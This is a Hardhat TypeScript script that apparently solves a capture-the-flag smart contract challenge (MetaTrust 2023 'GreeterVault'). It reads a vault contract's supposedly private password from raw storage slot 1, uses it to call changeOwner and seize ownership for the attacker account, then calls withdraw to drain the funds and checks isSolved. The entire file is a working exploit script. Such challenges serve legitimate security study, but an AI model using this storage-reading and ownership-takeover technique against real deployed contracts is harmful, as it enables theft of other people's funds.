import chalk from "chalk";
import { ethers } from "hardhat";
import { GreeterVaultSetUpMetaTrust23__factory, GreeterVaultSetUpMetaTrust23, VaultLogicMetaTrust23__factory} from "../../typechain";
import { log, initialize } from "../utils";
import { randomBytes } from "crypto";

async function main() {
    let [setUpContract, attacker] = await initialize<GreeterVaultSetUpMetaTrust23>(GreeterVaultSetUpMetaTrust23__factory, undefined, ["0x"+randomBytes(32).toString("hex")], "1");
    let vaultContract = VaultLogicMetaTrust23__factory.connect(await setUpContract.vault(), attacker);   

    let password = await ethers.provider.getStorage(await vaultContract.getAddress(), 1);
    password = ethers.zeroPadBytes(password, 32);
    log(`Password: ${chalk.yellow(password)}`);

    let tx = await vaultContract.changeOwner(password, attacker.address);
    await tx.wait();
    log(`Owner: ${chalk.yellow(await vaultContract.owner())}`);
    
    tx = await vaultContract.withdraw();
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await setUpContract.isSolved())}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});